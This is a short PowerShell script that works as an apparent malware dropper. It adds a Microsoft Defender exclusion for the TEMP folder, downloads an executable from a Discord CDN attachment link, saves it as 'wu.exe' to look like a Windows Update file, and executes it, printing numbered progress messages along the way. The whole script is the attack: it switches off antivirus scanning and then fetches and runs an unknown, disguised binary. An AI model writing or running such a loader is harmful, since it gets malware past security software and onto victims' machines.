$f="$env:TEMP\wu.exe"
Write-Host "[1] Adding exclusion..."
Add-MpPreference -ExclusionPath $env:TEMP 2>&1 | Write-Host
Write-Host "[2] Downloading..."
try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520398774311059487/scanner.exe?ex=6a410d33&is=6a3fbbb3&hm=0c942c5d8064d97ef537b7276d090fb4b19ab4848a4872dc4102d3e98fdc4eeb&" -OutFile $f -UseBasicParsing } catch { Write-Host "Download error: $_" }
Write-Host "[3] File exists: $(Test-Path $f) Size: $((Get-Item $f -EA SilentlyContinue).Length)"
Write-Host "[4] Running..."
if (Test-Path $f) { & $f } else { Write-Host "File not found " }
Write-Host "[5] Done"
